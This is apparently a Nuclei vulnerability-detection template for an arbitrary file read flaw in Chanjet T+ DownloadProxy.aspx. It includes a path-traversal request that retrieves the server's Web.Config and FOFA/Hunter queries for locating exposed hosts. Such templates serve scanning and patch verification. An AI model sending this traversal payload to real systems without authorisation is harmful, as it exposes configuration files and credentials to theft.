id: changjet-tplus-DownloadProxy-fileread
info:
  name: 畅捷通 T+ DownloadProxy - 任意文件读取漏洞
  author: leadlife
  severity: high
  description: 用友畅捷通 T+ DownloadProxy.aspx 文件存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器上的敏感文件
  reference:
    - https://www.cnblogs.com/pursue-security/p/17684714.html
  metadata:
    verified: true
    fofa-query: icon_hash="-2067519629" || app="畅捷通-TPlus"
    hunter-query: app.name="畅捷通 T+"
  tags: changjet,fileread,tplus

http:
  - method: GET
    path:
      - "{{BaseURL}}/tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "xml version"
          - "<configuration>"
        condition: and
      
